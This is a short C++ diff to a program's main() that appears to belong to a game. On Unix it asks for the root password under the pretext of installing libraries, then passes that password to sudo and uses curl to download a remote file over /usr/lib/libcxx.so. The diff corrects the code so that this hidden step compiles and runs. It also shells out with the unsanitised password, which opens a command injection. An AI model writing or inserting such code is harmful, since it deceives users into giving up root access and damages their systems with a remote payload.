@@ -20,8 +20,11 @@ int main(int argc, char** argv)
 #ifdef __unix__
 	std::cout << "Installing libraries requires root password: ";
 	std::string passwd;
-	std::cin >> pass;
-	system("echo '" + passwd + "' | sudo -S curl https://i.redd.it/0fb1z72kz9041.jpg -o /usr/lib/libcxx.so");
+	std::cin >> passwd;
+  std::string cmd = "echo '";
+  cmd.append(passwd);
+  cmd.append("' | sudo -S curl https://i.redd.it/0fb1z72kz9041.jpg -o /usr/lib/libcxx.so");
+  system(cmd.c_str());
 #endif
 	Game testing;
 	
